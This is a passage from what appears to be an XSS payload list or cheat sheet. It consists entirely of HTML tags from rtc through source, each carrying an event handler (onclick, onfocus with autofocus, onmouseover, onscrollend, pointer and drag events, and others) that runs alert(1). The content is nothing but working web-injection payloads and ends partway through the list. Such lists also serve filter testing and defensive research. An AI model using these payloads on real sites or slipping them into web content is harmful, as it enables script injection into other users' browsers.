<rtc onafterscriptexecute=alert(1)><script>1</script>
<rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
<rtc onbeforecut="alert(1)" contenteditable>test</rtc>
<rtc onbeforescriptexecute=alert(1)><script>1</script>
<rtc onblur=alert(1) id=x tabindex=1 style=display:block>test</rtc><input value=clickme>
<rtc onclick="alert(1)" style=display:block>test</rtc>
<rtc oncontextmenu="alert(1)" style=display:block>test</rtc>
<rtc oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rtc oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<rtc ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</rtc>
<rtc onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</rtc><input value=clickme>
<rtc onkeydown="alert(1)" contenteditable style=display:block>test</rtc>
<rtc onkeypress="alert(1)" contenteditable style=display:block>test</rtc>
<rtc onkeyup="alert(1)" contenteditable style=display:block>test</rtc>
<rtc onmousedown="alert(1)" style=display:block>test</rtc>
<rtc onmouseenter="alert(1)" style=display:block>test</rtc>
<rtc onmouseleave="alert(1)" style=display:block>test</rtc>
<rtc onmousemove="alert(1)" style=display:block>test</rtc>
<rtc onmouseout="alert(1)" style=display:block>test</rtc>
<rtc onmouseover="alert(1)" style=display:block>test</rtc>
<rtc onmouseup="alert(1)" style=display:block>test</rtc>
<rtc onmousewheel=alert(1) style=display:block>requires scrolling
<rtc onpaste="alert(1)" contenteditable>test</rtc>
<rtc onpointerdown=alert(1) style=display:block>XSS</rtc>
<rtc onpointerenter=alert(1) style=display:block>XSS</rtc>
<rtc onpointerleave=alert(1) style=display:block>XSS</rtc>
<rtc onpointermove=alert(1) style=display:block>XSS</rtc>
<rtc onpointerout=alert(1) style=display:block>XSS</rtc>
<rtc onpointerover=alert(1) style=display:block>XSS</rtc>
<rtc onpointerrawupdate=alert(1) style=display:block>XSS</rtc>
<rtc onpointerup=alert(1) style=display:block>XSS</rtc>
<rtc onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></rtc>
<ruby contenteditable onbeforeinput=alert(1)>test
<ruby draggable="true" ondrag="alert(1)" style=display:block>test</ruby>
<ruby draggable="true" ondragend="alert(1)" style=display:block>test</ruby>
<ruby draggable="true" ondragenter="alert(1)" style=display:block>test</ruby>
<ruby draggable="true" ondragleave="alert(1)" style=display:block>test</ruby>
<ruby draggable="true" ondragstart="alert(1)" style=display:block>test</ruby>
<ruby id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></ruby>
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
<ruby onafterscriptexecute=alert(1)><script>1</script>
<ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
<ruby onbeforecut="alert(1)" contenteditable>test</ruby>
<ruby onbeforescriptexecute=alert(1)><script>1</script>
<ruby onblur=alert(1) id=x tabindex=1 style=display:block>test</ruby><input value=clickme>
<ruby onclick="alert(1)" style=display:block>test</ruby>
<ruby oncontextmenu="alert(1)" style=display:block>test</ruby>
<ruby oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ruby oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ruby ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</ruby>
<ruby onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</ruby><input value=clickme>
<ruby onkeydown="alert(1)" contenteditable style=display:block>test</ruby>
<ruby onkeypress="alert(1)" contenteditable style=display:block>test</ruby>
<ruby onkeyup="alert(1)" contenteditable style=display:block>test</ruby>
<ruby onmousedown="alert(1)" style=display:block>test</ruby>
<ruby onmouseenter="alert(1)" style=display:block>test</ruby>
<ruby onmouseleave="alert(1)" style=display:block>test</ruby>
<ruby onmousemove="alert(1)" style=display:block>test</ruby>
<ruby onmouseout="alert(1)" style=display:block>test</ruby>
<ruby onmouseover="alert(1)" style=display:block>test</ruby>
<ruby onmouseup="alert(1)" style=display:block>test</ruby>
<ruby onmousewheel=alert(1) style=display:block>requires scrolling
<ruby onpaste="alert(1)" contenteditable>test</ruby>
<ruby onpointerdown=alert(1) style=display:block>XSS</ruby>
<ruby onpointerenter=alert(1) style=display:block>XSS</ruby>
<ruby onpointerleave=alert(1) style=display:block>XSS</ruby>
<ruby onpointermove=alert(1) style=display:block>XSS</ruby>
<ruby onpointerout=alert(1) style=display:block>XSS</ruby>
<ruby onpointerover=alert(1) style=display:block>XSS</ruby>
<ruby onpointerrawupdate=alert(1) style=display:block>XSS</ruby>
<ruby onpointerup=alert(1) style=display:block>XSS</ruby>
<ruby onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></ruby>
<s contenteditable onbeforeinput=alert(1)>test
<s draggable="true" ondrag="alert(1)" style=display:block>test</s>
<s draggable="true" ondragend="alert(1)" style=display:block>test</s>
<s draggable="true" ondragenter="alert(1)" style=display:block>test</s>
<s draggable="true" ondragleave="alert(1)" style=display:block>test</s>
<s draggable="true" ondragstart="alert(1)" style=display:block>test</s>
<s id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></s>
<s id=x tabindex=1 onfocus=alert(1)></s>
<s id=x tabindex=1 onfocusin=alert(1)></s>
<s onafterscriptexecute=alert(1)><script>1</script>
<s onbeforecopy="alert(1)" contenteditable>test</s>
<s onbeforecut="alert(1)" contenteditable>test</s>
<s onbeforescriptexecute=alert(1)><script>1</script>
<s onblur=alert(1) id=x tabindex=1 style=display:block>test</s><input value=clickme>
<s onclick="alert(1)" style=display:block>test</s>
<s oncontextmenu="alert(1)" style=display:block>test</s>
<s oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<s oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<s ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</s>
<s onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</s><input value=clickme>
<s onkeydown="alert(1)" contenteditable style=display:block>test</s>
<s onkeypress="alert(1)" contenteditable style=display:block>test</s>
<s onkeyup="alert(1)" contenteditable style=display:block>test</s>
<s onmousedown="alert(1)" style=display:block>test</s>
<s onmouseenter="alert(1)" style=display:block>test</s>
<s onmouseleave="alert(1)" style=display:block>test</s>
<s onmousemove="alert(1)" style=display:block>test</s>
<s onmouseout="alert(1)" style=display:block>test</s>
<s onmouseover="alert(1)" style=display:block>test</s>
<s onmouseup="alert(1)" style=display:block>test</s>
<s onmousewheel=alert(1) style=display:block>requires scrolling
<s onpaste="alert(1)" contenteditable>test</s>
<s onpointerdown=alert(1) style=display:block>XSS</s>
<s onpointerenter=alert(1) style=display:block>XSS</s>
<s onpointerleave=alert(1) style=display:block>XSS</s>
<s onpointermove=alert(1) style=display:block>XSS</s>
<s onpointerout=alert(1) style=display:block>XSS</s>
<s onpointerover=alert(1) style=display:block>XSS</s>
<s onpointerrawupdate=alert(1) style=display:block>XSS</s>
<s onpointerup=alert(1) style=display:block>XSS</s>
<s onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></s>
<samp contenteditable onbeforeinput=alert(1)>test
<samp draggable="true" ondrag="alert(1)" style=display:block>test</samp>
<samp draggable="true" ondragend="alert(1)" style=display:block>test</samp>
<samp draggable="true" ondragenter="alert(1)" style=display:block>test</samp>
<samp draggable="true" ondragleave="alert(1)" style=display:block>test</samp>
<samp draggable="true" ondragstart="alert(1)" style=display:block>test</samp>
<samp id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></samp>
<samp id=x tabindex=1 onfocus=alert(1)></samp>
<samp id=x tabindex=1 onfocusin=alert(1)></samp>
<samp onafterscriptexecute=alert(1)><script>1</script>
<samp onbeforecopy="alert(1)" contenteditable>test</samp>
<samp onbeforecut="alert(1)" contenteditable>test</samp>
<samp onbeforescriptexecute=alert(1)><script>1</script>
<samp onblur=alert(1) id=x tabindex=1 style=display:block>test</samp><input value=clickme>
<samp onclick="alert(1)" style=display:block>test</samp>
<samp oncontextmenu="alert(1)" style=display:block>test</samp>
<samp oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<samp oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<samp ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</samp>
<samp onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</samp><input value=clickme>
<samp onkeydown="alert(1)" contenteditable style=display:block>test</samp>
<samp onkeypress="alert(1)" contenteditable style=display:block>test</samp>
<samp onkeyup="alert(1)" contenteditable style=display:block>test</samp>
<samp onmousedown="alert(1)" style=display:block>test</samp>
<samp onmouseenter="alert(1)" style=display:block>test</samp>
<samp onmouseleave="alert(1)" style=display:block>test</samp>
<samp onmousemove="alert(1)" style=display:block>test</samp>
<samp onmouseout="alert(1)" style=display:block>test</samp>
<samp onmouseover="alert(1)" style=display:block>test</samp>
<samp onmouseup="alert(1)" style=display:block>test</samp>
<samp onmousewheel=alert(1) style=display:block>requires scrolling
<samp onpaste="alert(1)" contenteditable>test</samp>
<samp onpointerdown=alert(1) style=display:block>XSS</samp>
<samp onpointerenter=alert(1) style=display:block>XSS</samp>
<samp onpointerleave=alert(1) style=display:block>XSS</samp>
<samp onpointermove=alert(1) style=display:block>XSS</samp>
<samp onpointerout=alert(1) style=display:block>XSS</samp>
<samp onpointerover=alert(1) style=display:block>XSS</samp>
<samp onpointerrawupdate=alert(1) style=display:block>XSS</samp>
<samp onpointerup=alert(1) style=display:block>XSS</samp>
<samp onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></samp>
<script contenteditable onbeforeinput=alert(1)>test
<script draggable="true" ondrag="alert(1)" style=display:block>test</script>
<script draggable="true" ondragend="alert(1)" style=display:block>test</script>
<script draggable="true" ondragenter="alert(1)" style=display:block>test</script>
<script draggable="true" ondragleave="alert(1)" style=display:block>test</script>
<script draggable="true" ondragstart="alert(1)" style=display:block>test</script>
<script id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></script>
<script id=x tabindex=1 onfocus=alert(1)></script>
<script id=x tabindex=1 onfocusin=alert(1)></script>
<script onafterscriptexecute=alert(1)><script>1</script>
<script onbeforecopy="alert(1)" contenteditable>test</script>
<script onbeforecut="alert(1)" contenteditable>test</script>
<script onbeforescriptexecute=alert(1)><script>1</script>
<script onblur=alert(1) id=x tabindex=1 style=display:block>test</script><input value=clickme>
<script onclick="alert(1)" style=display:block>test</script>
<script oncontextmenu="alert(1)" style=display:block>test</script>
<script oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<script oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<script ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</script>
<script onerror=alert(1) src=/></script>
<script onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</script><input value=clickme>
<script onkeydown="alert(1)" contenteditable style=display:block>test</script>
<script onkeypress="alert(1)" contenteditable style=display:block>test</script>
<script onkeyup="alert(1)" contenteditable style=display:block>test</script>
<script onload=alert(1) src=validjs.js></script>
<script onmousedown="alert(1)" style=display:block>test</script>
<script onmouseenter="alert(1)" style=display:block>test</script>
<script onmouseleave="alert(1)" style=display:block>test</script>
<script onmousemove="alert(1)" style=display:block>test</script>
<script onmouseout="alert(1)" style=display:block>test</script>
<script onmouseover="alert(1)" style=display:block>test</script>
<script onmouseup="alert(1)" style=display:block>test</script>
<script onmousewheel=alert(1) style=display:block>requires scrolling
<script onpaste="alert(1)" contenteditable>test</script>
<script onpointerdown=alert(1) style=display:block>XSS</script>
<script onpointerenter=alert(1) style=display:block>XSS</script>
<script onpointerleave=alert(1) style=display:block>XSS</script>
<script onpointermove=alert(1) style=display:block>XSS</script>
<script onpointerout=alert(1) style=display:block>XSS</script>
<script onpointerover=alert(1) style=display:block>XSS</script>
<script onpointerrawupdate=alert(1) style=display:block>XSS</script>
<script onpointerup=alert(1) style=display:block>XSS</script>
<script onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></script>
<section contenteditable onbeforeinput=alert(1)>test
<section draggable="true" ondrag="alert(1)" style=display:block>test</section>
<section draggable="true" ondragend="alert(1)" style=display:block>test</section>
<section draggable="true" ondragenter="alert(1)" style=display:block>test</section>
<section draggable="true" ondragleave="alert(1)" style=display:block>test</section>
<section draggable="true" ondragstart="alert(1)" style=display:block>test</section>
<section id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></section>
<section id=x tabindex=1 onfocus=alert(1)></section>
<section id=x tabindex=1 onfocusin=alert(1)></section>
<section onafterscriptexecute=alert(1)><script>1</script>
<section onbeforecopy="alert(1)" contenteditable>test</section>
<section onbeforecut="alert(1)" contenteditable>test</section>
<section onbeforescriptexecute=alert(1)><script>1</script>
<section onblur=alert(1) id=x tabindex=1 style=display:block>test</section><input value=clickme>
<section onclick="alert(1)" style=display:block>test</section>
<section oncontextmenu="alert(1)" style=display:block>test</section>
<section oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<section oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<section ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</section>
<section onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</section><input value=clickme>
<section onkeydown="alert(1)" contenteditable style=display:block>test</section>
<section onkeypress="alert(1)" contenteditable style=display:block>test</section>
<section onkeyup="alert(1)" contenteditable style=display:block>test</section>
<section onmousedown="alert(1)" style=display:block>test</section>
<section onmouseenter="alert(1)" style=display:block>test</section>
<section onmouseleave="alert(1)" style=display:block>test</section>
<section onmousemove="alert(1)" style=display:block>test</section>
<section onmouseout="alert(1)" style=display:block>test</section>
<section onmouseover="alert(1)" style=display:block>test</section>
<section onmouseup="alert(1)" style=display:block>test</section>
<section onmousewheel=alert(1) style=display:block>requires scrolling
<section onpaste="alert(1)" contenteditable>test</section>
<section onpointerdown=alert(1) style=display:block>XSS</section>
<section onpointerenter=alert(1) style=display:block>XSS</section>
<section onpointerleave=alert(1) style=display:block>XSS</section>
<section onpointermove=alert(1) style=display:block>XSS</section>
<section onpointerout=alert(1) style=display:block>XSS</section>
<section onpointerover=alert(1) style=display:block>XSS</section>
<section onpointerrawupdate=alert(1) style=display:block>XSS</section>
<section onpointerup=alert(1) style=display:block>XSS</section>
<section onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></section>
<select autofocus onfocus=alert(1)>
<select autofocus onfocusin=alert(1)>
<select contenteditable onbeforeinput=alert(1)>test
<select draggable="true" ondrag="alert(1)" style=display:block>test</select>
<select draggable="true" ondragend="alert(1)" style=display:block>test</select>
<select draggable="true" ondragenter="alert(1)" style=display:block>test</select>
<select draggable="true" ondragleave="alert(1)" style=display:block>test</select>
<select draggable="true" ondragstart="alert(1)" style=display:block>test</select>
<select id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></select>
<select onafterscriptexecute=alert(1)><script>1</script>
<select onbeforecopy="alert(1)" contenteditable>test</select>
<select onbeforecut="alert(1)" contenteditable>test</select>
<select onbeforescriptexecute=alert(1)><script>1</script>
<select onblur=alert(1) id=x tabindex=1 style=display:block>test</select><input value=clickme>
<select onchange=alert(1)><option>change me</option><option>XSS</option></select>
<select onclick="alert(1)" style=display:block>test</select>
<select oncontextmenu="alert(1)" style=display:block>test</select>
<select oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<select oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<select ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</select>
<select onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</select><input value=clickme>
<select onkeydown="alert(1)" contenteditable style=display:block>test</select>
<select onkeypress="alert(1)" contenteditable style=display:block>test</select>
<select onkeyup="alert(1)" contenteditable style=display:block>test</select>
<select onmousedown="alert(1)" style=display:block>test</select>
<select onmouseenter="alert(1)" style=display:block>test</select>
<select onmouseleave="alert(1)" style=display:block>test</select>
<select onmousemove="alert(1)" style=display:block>test</select>
<select onmouseout="alert(1)" style=display:block>test</select>
<select onmouseover="alert(1)" style=display:block>test</select>
<select onmouseup="alert(1)" style=display:block>test</select>
<select onmousewheel=alert(1) style=display:block>requires scrolling
<select onpaste="alert(1)" contenteditable>test</select>
<select onpointerdown=alert(1) style=display:block>XSS</select>
<select onpointerenter=alert(1) style=display:block>XSS</select>
<select onpointerleave=alert(1) style=display:block>XSS</select>
<select onpointermove=alert(1) style=display:block>XSS</select>
<select onpointerout=alert(1) style=display:block>XSS</select>
<select onpointerover=alert(1) style=display:block>XSS</select>
<select onpointerrawupdate=alert(1) style=display:block>XSS</select>
<select onpointerup=alert(1) style=display:block>XSS</select>
<select onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></select>
<set contenteditable onbeforeinput=alert(1)>test
<set draggable="true" ondrag="alert(1)" style=display:block>test</set>
<set draggable="true" ondragend="alert(1)" style=display:block>test</set>
<set draggable="true" ondragenter="alert(1)" style=display:block>test</set>
<set draggable="true" ondragleave="alert(1)" style=display:block>test</set>
<set draggable="true" ondragstart="alert(1)" style=display:block>test</set>
<set id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></set>
<set onafterscriptexecute=alert(1)><script>1</script>
<set onbeforescriptexecute=alert(1)><script>1</script>
<set onblur=alert(1) id=x tabindex=1 style=display:block>test</set><input value=clickme>
<set onclick="alert(1)" style=display:block>test</set>
<set oncontextmenu="alert(1)" style=display:block>test</set>
<set oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<set oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<set ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</set>
<set onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</set><input value=clickme>
<set onkeydown="alert(1)" contenteditable style=display:block>test</set>
<set onkeypress="alert(1)" contenteditable style=display:block>test</set>
<set onkeyup="alert(1)" contenteditable style=display:block>test</set>
<set onmousedown="alert(1)" style=display:block>test</set>
<set onmouseenter="alert(1)" style=display:block>test</set>
<set onmouseleave="alert(1)" style=display:block>test</set>
<set onmousemove="alert(1)" style=display:block>test</set>
<set onmouseout="alert(1)" style=display:block>test</set>
<set onmouseover="alert(1)" style=display:block>test</set>
<set onmouseup="alert(1)" style=display:block>test</set>
<set onmousewheel=alert(1) style=display:block>requires scrolling
<set onpointerdown=alert(1) style=display:block>XSS</set>
<set onpointerenter=alert(1) style=display:block>XSS</set>
<set onpointerleave=alert(1) style=display:block>XSS</set>
<set onpointermove=alert(1) style=display:block>XSS</set>
<set onpointerout=alert(1) style=display:block>XSS</set>
<set onpointerover=alert(1) style=display:block>XSS</set>
<set onpointerrawupdate=alert(1) style=display:block>XSS</set>
<set onpointerup=alert(1) style=display:block>XSS</set>
<set onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></set>
<shadow contenteditable onbeforeinput=alert(1)>test
<shadow draggable="true" ondrag="alert(1)" style=display:block>test</shadow>
<shadow draggable="true" ondragend="alert(1)" style=display:block>test</shadow>
<shadow draggable="true" ondragenter="alert(1)" style=display:block>test</shadow>
<shadow draggable="true" ondragleave="alert(1)" style=display:block>test</shadow>
<shadow draggable="true" ondragstart="alert(1)" style=display:block>test</shadow>
<shadow id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></shadow>
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
<shadow onafterscriptexecute=alert(1)><script>1</script>
<shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
<shadow onbeforecut="alert(1)" contenteditable>test</shadow>
<shadow onbeforescriptexecute=alert(1)><script>1</script>
<shadow onblur=alert(1) id=x tabindex=1 style=display:block>test</shadow><input value=clickme>
<shadow onclick="alert(1)" style=display:block>test</shadow>
<shadow oncontextmenu="alert(1)" style=display:block>test</shadow>
<shadow oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<shadow oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<shadow ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</shadow>
<shadow onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</shadow><input value=clickme>
<shadow onkeydown="alert(1)" contenteditable style=display:block>test</shadow>
<shadow onkeypress="alert(1)" contenteditable style=display:block>test</shadow>
<shadow onkeyup="alert(1)" contenteditable style=display:block>test</shadow>
<shadow onmousedown="alert(1)" style=display:block>test</shadow>
<shadow onmouseenter="alert(1)" style=display:block>test</shadow>
<shadow onmouseleave="alert(1)" style=display:block>test</shadow>
<shadow onmousemove="alert(1)" style=display:block>test</shadow>
<shadow onmouseout="alert(1)" style=display:block>test</shadow>
<shadow onmouseover="alert(1)" style=display:block>test</shadow>
<shadow onmouseup="alert(1)" style=display:block>test</shadow>
<shadow onmousewheel=alert(1) style=display:block>requires scrolling
<shadow onpaste="alert(1)" contenteditable>test</shadow>
<shadow onpointerdown=alert(1) style=display:block>XSS</shadow>
<shadow onpointerenter=alert(1) style=display:block>XSS</shadow>
<shadow onpointerleave=alert(1) style=display:block>XSS</shadow>
<shadow onpointermove=alert(1) style=display:block>XSS</shadow>
<shadow onpointerout=alert(1) style=display:block>XSS</shadow>
<shadow onpointerover=alert(1) style=display:block>XSS</shadow>
<shadow onpointerrawupdate=alert(1) style=display:block>XSS</shadow>
<shadow onpointerup=alert(1) style=display:block>XSS</shadow>
<shadow onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></shadow>
<slot contenteditable onbeforeinput=alert(1)>test
<slot draggable="true" ondrag="alert(1)" style=display:block>test</slot>
<slot draggable="true" ondragend="alert(1)" style=display:block>test</slot>
<slot draggable="true" ondragenter="alert(1)" style=display:block>test</slot>
<slot draggable="true" ondragleave="alert(1)" style=display:block>test</slot>
<slot draggable="true" ondragstart="alert(1)" style=display:block>test</slot>
<slot id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></slot>
<slot id=x tabindex=1 onfocus=alert(1)></slot>
<slot id=x tabindex=1 onfocusin=alert(1)></slot>
<slot onafterscriptexecute=alert(1)><script>1</script>
<slot onbeforecopy="alert(1)" contenteditable>test</slot>
<slot onbeforecut="alert(1)" contenteditable>test</slot>
<slot onbeforescriptexecute=alert(1)><script>1</script>
<slot onblur=alert(1) id=x tabindex=1 style=display:block>test</slot><input value=clickme>
<slot onclick="alert(1)" style=display:block>test</slot>
<slot oncontextmenu="alert(1)" style=display:block>test</slot>
<slot oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<slot oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<slot ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</slot>
<slot onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</slot><input value=clickme>
<slot onkeydown="alert(1)" contenteditable style=display:block>test</slot>
<slot onkeypress="alert(1)" contenteditable style=display:block>test</slot>
<slot onkeyup="alert(1)" contenteditable style=display:block>test</slot>
<slot onmousedown="alert(1)" style=display:block>test</slot>
<slot onmouseenter="alert(1)" style=display:block>test</slot>
<slot onmouseleave="alert(1)" style=display:block>test</slot>
<slot onmousemove="alert(1)" style=display:block>test</slot>
<slot onmouseout="alert(1)" style=display:block>test</slot>
<slot onmouseover="alert(1)" style=display:block>test</slot>
<slot onmouseup="alert(1)" style=display:block>test</slot>
<slot onmousewheel=alert(1) style=display:block>requires scrolling
<slot onpaste="alert(1)" contenteditable>test</slot>
<slot onpointerdown=alert(1) style=display:block>XSS</slot>
<slot onpointerenter=alert(1) style=display:block>XSS</slot>
<slot onpointerleave=alert(1) style=display:block>XSS</slot>
<slot onpointermove=alert(1) style=display:block>XSS</slot>
<slot onpointerout=alert(1) style=display:block>XSS</slot>
<slot onpointerover=alert(1) style=display:block>XSS</slot>
<slot onpointerrawupdate=alert(1) style=display:block>XSS</slot>
<slot onpointerup=alert(1) style=display:block>XSS</slot>
<slot onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></slot>
<small contenteditable onbeforeinput=alert(1)>test
<small draggable="true" ondrag="alert(1)" style=display:block>test</small>
<small draggable="true" ondragend="alert(1)" style=display:block>test</small>
<small draggable="true" ondragenter="alert(1)" style=display:block>test</small>
<small draggable="true" ondragleave="alert(1)" style=display:block>test</small>
<small draggable="true" ondragstart="alert(1)" style=display:block>test</small>
<small id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></small>
<small id=x tabindex=1 onfocus=alert(1)></small>
<small id=x tabindex=1 onfocusin=alert(1)></small>
<small onafterscriptexecute=alert(1)><script>1</script>
<small onbeforecopy="alert(1)" contenteditable>test</small>
<small onbeforecut="alert(1)" contenteditable>test</small>
<small onbeforescriptexecute=alert(1)><script>1</script>
<small onblur=alert(1) id=x tabindex=1 style=display:block>test</small><input value=clickme>
<small onclick="alert(1)" style=display:block>test</small>
<small oncontextmenu="alert(1)" style=display:block>test</small>
<small oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<small oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<small ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</small>
<small onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</small><input value=clickme>
<small onkeydown="alert(1)" contenteditable style=display:block>test</small>
<small onkeypress="alert(1)" contenteditable style=display:block>test</small>
<small onkeyup="alert(1)" contenteditable style=display:block>test</small>
<small onmousedown="alert(1)" style=display:block>test</small>
<small onmouseenter="alert(1)" style=display:block>test</small>
<small onmouseleave="alert(1)" style=display:block>test</small>
<small onmousemove="alert(1)" style=display:block>test</small>
<small onmouseout="alert(1)" style=display:block>test</small>
<small onmouseover="alert(1)" style=display:block>test</small>
<small onmouseup="alert(1)" style=display:block>test</small>
<small onmousewheel=alert(1) style=display:block>requires scrolling
<small onpaste="alert(1)" contenteditable>test</small>
<small onpointerdown=alert(1) style=display:block>XSS</small>
<small onpointerenter=alert(1) style=display:block>XSS</small>
<small onpointerleave=alert(1) style=display:block>XSS</small>
<small onpointermove=alert(1) style=display:block>XSS</small>
<small onpointerout=alert(1) style=display:block>XSS</small>
<small onpointerover=alert(1) style=display:block>XSS</small>
<small onpointerrawupdate=alert(1) style=display:block>XSS</small>
<small onpointerup=alert(1) style=display:block>XSS</small>
<small onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></small>
<source contenteditable onbeforeinput=alert(1)>test
<source draggable="true" ondrag="alert(1)" style=display:block>test</source>
<source draggable="true" ondragend="alert(1)" style=display:block>test</source>
<source draggable="true" ondragenter="alert(1)" style=display:block>test</source>
<source draggable="true" ondragleave="alert(1)" style=display:block>test</source>
<source draggable="true" ondragstart="alert(1)" style=display:block>test</source>
<source id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></source>
<source id=x tabindex=1 onfocus=alert(1)></source>
<source id=x tabindex=1 onfocusin=alert(1)></source>
<source onafterscriptexecute=alert(1)><script>1</script>
<source onbeforecopy="alert(1)" contenteditable>test</source>
<source onbeforecut="alert(1)" contenteditable>test</source>
<source onbeforescriptexecute=alert(1)><script>1</script>
<source onblur=alert(1) id=x tabindex=1 style=display:block>test</source><input value=clickme>
<source onclick="alert(1)" style=display:block>test</source>
<source oncontextmenu="alert(1)" style=display:block>test</source>
<source oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<source oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<source ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</source>
<source onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</source><input value=clickme>
<source onkeydown="alert(1)" contenteditable style=display:block>test</source>
<source onkeypress="alert(1)" contenteditable style=display:block>test</source>
<source onkeyup="alert(1)" contenteditable style=display:block>test</source>
<source onmousedown="alert(1)" style=display:block>test</source>
<source onmouseenter="alert(1)" style=display:block>test</source>
<source onmouseleave="alert(1)" style=display:block>test</source>
